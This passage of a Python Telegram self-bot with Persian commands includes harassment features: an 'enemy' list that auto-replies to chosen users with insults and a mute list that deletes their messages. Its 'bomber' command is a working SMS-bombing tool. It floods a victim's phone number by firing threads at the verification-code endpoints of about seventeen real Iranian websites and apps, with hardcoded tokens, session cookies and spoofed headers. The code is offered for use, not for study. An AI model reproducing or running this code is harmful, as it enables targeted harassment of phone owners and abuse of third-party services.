    await app.edit_message_text(chat_id, msg_id, f"**<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name} is online 🗿**.</a>")






@app.on_message(filters.me & filters.regex('(?i)^دشمن$'))
async def enemy(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    user_id = message.reply_to_message.from_user.id
    name = message.reply_to_message.from_user.first_name
    #await app.block_user(user_id)
    target.append(user_id)
    await app.edit_message_text(chat_id, msg_id, f"**🦋 user <a href='tg://user?id={user_id}'>{name}</a> is added to enemy List**.")





@app.on_message(filters.me & filters.regex('(?i)^حذف دشمن$'))
async def unenemy(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    user_id = message.reply_to_message.from_user.id
    name = message.reply_to_message.from_user.first_name
    target.remove(user_id)
    await app.edit_message_text(chat_id, msg_id, f"**🕷️ user <a href='tg://user?id={user_id}'>{name}</a> is delete from enemy List.**")





@app.on_message(filters.me & filters.regex('(?i)^لیست دشمن$'))
async def list_enemy(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, "لیست دشمن بر اساس ایدی عددی : \n\n"+str(target))




@app.on_message(filters.me & filters.regex('(?i)^پاکسازی لیست دشمن$'))
async def delete_list_enemy(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    for user_id in target:
        await app.unblock_user(user_id)
    target.clear()
    await app.edit_message_text(chat_id, msg_id, "**لیست دشمن ربات پاکسازی شد.**")





@app.on_message(filters.me & filters.regex('(?i)^سکوت$'))
async def mute(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    user_id = message.reply_to_message.from_user.id
    name = message.reply_to_message.from_user.first_name
    muute.append(user_id)
    await app.edit_message_text(chat_id, msg_id, f"**🕊️ user <a href='tg://user?id={user_id}'>{name}</a> is added to mute List.**")




@app.on_message(filters.me & filters.regex('(?i)^حذف سکوت$'))
async def unmute(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    user_id = message.reply_to_message.from_user.id
    name = message.reply_to_message.from_user.first_name
    muute.remove(user_id)
    await app.edit_message_text(chat_id, msg_id, f"**🌹 user <a href='tg://user?id={user_id}'>{name}</a> is delete from mute List.**")




async def change_time_profile():
    if status_time[0] == 'on':
        fonts = [{"0":"Ѳ","1":"❶","2":"❷","3":"❸","4":"❹","5":"❺","6":"❻","7":"❼","8":"❽","9":"❾"}, {"0":"𝟘","1":"𝟙","2":"𝟚","3":"𝟛","4":"𝟜","5":"𝟝","6":"𝟞","7":"𝟟","8":"𝟠","9":"𝟡"}]
        country_time_zone = pytz.timezone('Asia/Tehran')
        country_time = datetime.now(country_time_zone)
        time = country_time.strftime("%H:%M")
        gg = time.translate(str.maketrans(random.choice(fonts)))
        await app.update_profile(bio=gg)
    else:
        ThePurea = 'ThePurea'





@app.on_message(filters.me & filters.regex('(?i)^لیست سکوت$'))
async def list_mute(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, "💻 لیست سکوت بر اساس ایدی عددی : \n\n"+str(muute))





@app.on_message(filters.me & filters.regex('(?i)^پاکسازی لیست سکوت$'))
async def delete_list_mute(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    muute.clear()
    await app.edit_message_text(chat_id, msg_id, "**🍌 لیست سکوت ربات پاکسازی شد.**")





@app.on_message(filters.me & filters.regex('(?i)^راهنما$'))
async def help(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    help = """
🎀 `بکیرم`
🎀 `قلب`

🗿 `دشمن`
🗿 `حذف دشمن`
🗿 `پاکسازی لیست دشمن`
🗿 `لیست دشمن`

🏳️‍🌈 `سکوت`
🏳️‍🌈 `حذف سکوت`
🏳️‍🌈 `پاکسازی لیست سکوت`
🏳️‍🌈 `لیست سکوت`

🥂 `gp`
🥂 `pv`
🥂 `bomber 2 `0912€€€$$√√
🥂 `وایسا`
🥂 `ساعت روشن/خاموش`

🤖 `تایپینگ روشن`
🤖 `تایپینگ خاموش`
🔥 `گیمینگ روشن`
🔥 `گیمینگ خاموش`
🍌 `وضعیت کسکشی`
"""
    await app.edit_message_text(chat_id, msg_id, help)






@app.on_message(filters.me & filters.regex('(?i)^gp$'))
async def gp(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    info = await app.get_chat(chat_id)
    text = f"""
+ **CHAT_ID** : `{info.id}`
+ **COUNT** : `{info.members_count}`
+ **NAME** : `{info.title}`
+ **INVITE LINK** : `{info.invite_link}`
"""
    await app.edit_message_text(chat_id, msg_id, str(text))




@app.on_message(filters.me & filters.regex('(?i)^وضعیت کسکشی$'))
async def status_action(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, f"""**وضعیت کسکشی اکانت برای حالت تایپینگ و بازی کردن به روایت زیر :

🤪 typing : `{type[0]}`
🥺 gaming : `{game[0]}`

**""")



@app.on_message(filters.me & filters.regex('(?i)^تایپینگ روشن$'))
async def action_type_on(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    type.clear()
    game.clear()
    game.append("off")
    type.append("on")
    await app.edit_message_text(chat_id, msg_id, "**🤖 type action new online.! 🤖**")



@app.on_message(filters.me & filters.regex('(?i)^تایپینگ خاموش$'))
async def action_type_off(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    type.clear()
    game.clear()
    game.append("off")
    type.append("off")
    await app.edit_message_text(chat_id, msg_id, "**🤖 type action new offline.! 🤖**")



@app.on_message(filters.me & filters.regex('(?i)^گیمینگ روشن$'))
async def action_game_on(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    type.clear()
    game.clear()
    game.append("on")
    type.append("off")
    await app.edit_message_text(chat_id, msg_id, "**🔥 game action new online.! 🔥**")



@app.on_message(filters.me & filters.regex('(?i)^گیمینگ خاموش$'))
async def action_game_off(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    type.clear()
    game.clear()
    game.append("off")
    type.append("off")
    await app.edit_message_text(chat_id, msg_id, "**🔥 game action new offline.! 🔥**")




@app.on_message(filters.me & filters.regex('(?i)^ساعت روشن$'))
async def change_status_time(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    status_time.clear()
    status_time.append("on")
    await app.edit_message_text(chat_id, msg_id, "**🔥 ساعت روشن شد 🔥**")





@app.on_message(filters.me & filters.regex('(?i)^ساعت خاموش$'))
async def change_status_time2(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    status_time.clear()
    status_time.append("off")
    await app.edit_message_text(chat_id, msg_id, "**🔥 ساعت خاموش شد 🔥**")



@app.on_message(filters.me & filters.regex('bomber'))
async def bomber(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    text = message.text.split()
    phone = str(text[1])
    number = str(text[2])
    if "09" in number:
        for kos in range(int(phone)):
            Thread(target=sventtubf, args=[number]).start()
            Thread(target=one, args=[number]).start()
            Thread(target=two, args=[number]).start()
            Thread(target=tree, args=[number]).start()
            Thread(target=fwor, args=[number]).start()
            Thread(target=five, args=[number]).start()
            Thread(target=six, args=[number]).start()
            Thread(target=seven, args=[number]).start()
            Thread(target=eyit, args=[number]).start()
            Thread(target=niyne, args=[number]).start()
            Thread(target=ten, args=[number]).start()
            Thread(target=eleven, args=[number]).start()
            Thread(target=tovelf, args=[number]).start()
            Thread(target=therty, args=[number]).start()
            Thread(target=forty, args=[number]).start()
            Thread(target=fifty, args=[number]).start()
            Thread(target=sixty, args=[number]).start()
            await asyncio.sleep(5)
        await app.edit_message_text(chat_id, msg_id, f"**{phone} sms sended.**")
    else:
        await app.edit_message_text(chat_id, msg_id, f"**🗿 error.**")







@app.on_message(filters.me)
async def me(client, message):
    chat_id = message.chat.id
    if str(game[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.PLAYING)
    elif str(type[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.TYPING)
    else:
        cr = "@ThePurea"




@app.on_message(filters.private)
async def filters_pv(client, message):
    chat_id = message.chat.id
    if str(game[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.PLAYING)
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
    elif str(type[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.TYPING)
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
    else:
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
        cr = "@ThePurea"




@app.on_message(filters.group)
async def filters_group(client, message):
    chat_id = message.chat.id
    if str(game[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.PLAYING)
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
    elif str(type[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.TYPING)
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
    else:
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
        cr = "@ThePurea"











def one(number):
    a = "http://app.insatel.ir/client_webservices.php"
    b = f"ac=10&appname=fk&phonenumber={number}&token=mw0yDKRVld&serial=null&keyname=verify2"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "85","Host": "app.insatel.ir","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def two(number):
    a = "http://setmester.com/mrfallowtel_glp/client_webservices4.php"
    b = f"ac=9&username=gyjoo8uyt&password=123456&fullname=hkurdds6&phonenumber={number}&token=1uhljuqBpI&serial=null"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "110","Host": "setmester.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def tree(number):
    a = "http://jozamoza.com/com.cyberspaceservices.yb/client_webservices4.php"
    b = f"ac=9&username=sjwo7ehd&password=123456&fullname=dheoe9dy&phonenumber={number}&token=qqcI33qkGC&serial=null"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "109","Host": "jozamoza.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def fwor(number):
    a = "https://api.nazdika.com/v3/account/request-login/"
    b = f"phone={number}"
    d = {"Accept": "Application/JSON","User-Agent": ",29;Xiaomi M90077J70CG;LTE","X-ODD-User-Agent": "Mozilla/9.0 (Linux; Android 10; M9007J540CG Build/QKQ1.97512.002; wv) AppleWebKit/9977.36 (KHTML, like Gecko) Version/4.0 Chrome/2000.0.4896.127 Mobile Safari/999.36","X-ODD-Operator": "IR-MCI,IR-MCI","X-ODD-SOURCE": "Nazdika-v-1140","X-ODD-MARKET": "googlePlay","X-ODD-IDENTIFIER": "null","X-ODD-ANDROID-ID": "lllllllllllll666llllllllll","Content-Type": "application/x-www-form-urlencoded","Content-Length": "17","Host": "api.nazdika.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def five(number):
    a = "http://followmember2022.ir/followmember/client_webservices4.php"
    b = f"ac=10&phonenumber={number}&token=CLTRIcCmcT&serial=null"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "58","Host": "followmember2022.ir","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def six(number):
    a = "https://iranstor1.ir/index.php/api/login?sms.ir"
    b = f"fullname=alimahmoodiu&mobile={number}&device_id=12365478911&token=c5aef1158542ea0932c1916f829d943c"
    d = {"Host": "iranstor1.ir","key": "d41d8cd98f00b204e9800998ecf8427e","apptoken": "VdOIvN6tHdgjNrmCr0PvSg==:NTU1ZDBhNGNiODY0NzgyNA==","content-type": "application/x-www-form-urlencoded","content-length": "115","accept-encoding": "gzip","cookie": "ci_session=181bfd8fd175d83b156a57e477afc7edbc703522","user-agent": "okhttp/3.5.0"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def seven(number):
    a = "https://homa.petabad.com/customer/signup"
    b = f"my_server_api_version=1&platform=android&my_app_type=android&my_app_version=17&time_zone_offset=270&app_name=customer&phone_number={number}"
    d = {"user-agent": "Dart/2.14 (dart:io)","content-type": "application/x-www-form-urlencoded; charset=utf-8","accept-encoding": "gzip","content-length": "142","host": "homa.petabad.com"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def eyit(number):
    a = "https://takhfifan.com/api/jsonrpc/1_0/"
    b = {"id":592419288011976410,"method":"customerExistOtp","params":["023804109885a10d02158eef65c5d887",{"username":number}]}
    d = {"Host": "takhfifan.com","x-session": "023804109885a10d02158eef65c5d887","content-type": "takhfifanApp/json","content-length": "126","accept-encoding": "gzip","user-agent": "okhttp/3.14.9"}
    try: 
        r = post(a, json=b, headers=d)
    except:
        cr = "ThePurea"


def niyne(number):
    a = "http://baharapp.xyz/api/v1.1/reqSMS.php"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "baharapp.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def ten(number):
    a = "http://serverpv1.xyz/api/v1/reqSMS"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "serverpv1.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def eleven(number):
    a = "http://kolbeapp.xyz/api/v1/reqSMS"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "kolbeapp.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def tovelf(number):
    a = "http://arezooapp.xyz/api/v1/reqSMS"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "arezooapp.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def therty(number):
    a = "http://servermv1.xyz/api/v1/reqSMS"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "servermv1.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def forty(number):
    a = "https://core.otaghak.com/odata/Otaghak/Users/ReadyForLogin"
    b = {"userName":number}
    d = {"Host": "core.otaghak.com","app-version": "235","app-version-name": "5.12.0","app-client": "guest","device-model": "POCO M2007J20CG","device-sdk": "29","user-agent": "app:5.12.0(235)@POCO M2007J20CG","content-type": "application/json; charset=UTF-8","content-length": "26","accept-encoding": "gzip"}
    try:
        r = post(a, json=b, headers=d)
    except:
        cr = "ThePurea"


def fifty(number):
    a = "https://gharar.ir/api/v1/users/"
    b = {"phone":number}
    d = {"Host": "gharar.ir","appversion": "1.5.4","content-type": "application/json; charset=UTF-8","content-length": "23","accept-encoding": "gzip","user-agent": "okhttp/4.9.2"}
    try:
        r = post(a, json=b, headers=d)
    except:
        cr = "ThePurea"


def sixty(number):
    a = "http://serverhv1.xyz/api/v1.1/reqSMS.php"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "serverhv1.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def sventtubf(number):
    get(f"https://cyclops.drnext.ir/v1/doctors/auth/check-doctor-exists-by-mobile?mobile={number}", headers={"Host": "cyclops.drnext.ir","accept-language": "fa","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin": "https://panel.drnext.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br"})
    options("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", headers={"Host": "cyclops.drnext.ir","accept": "*/*","access-control-request-method": "POST","access-control-request-headers": "content-type","origin": "https://panel.drnext.ir","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","sec-fetch-mode": "cors","sec-fetch-site": "same-site","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q=0.9,en;q=0.8,fa;q=0.7"})
    post("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", json={"mobile":number}, headers={"Host": "cyclops.drnext.ir","content-length": "24","accept": "application/json, text/plain, */*","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","origin": "https://panel.drnext.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": ",gzip, deflate, br"})
    options("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", headers={"Host": "cyclops.drnext.ir","accept": "*/*","access-control-request-method": "POST","access-control-request-headers": "content-type","origin": "https://panel.drnext.ir","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","sec-fetch-mode": "cors","sec-fetch-site": "same-site","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q=0.9,en;q=0.8,fa;q=0.7"})
    post("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", json={"mobile":number}, headers={"Host": "cyclops.drnext.ir","content-length": "24","accept": "application/json, text/plain, */*","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","origin": "https://panel.drnext.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br"})
    









scheduler = AsyncIOScheduler()
scheduler.add_job(change_time_profile, "interval", seconds=60)
scheduler.start()
app.run(print ('self is run...'))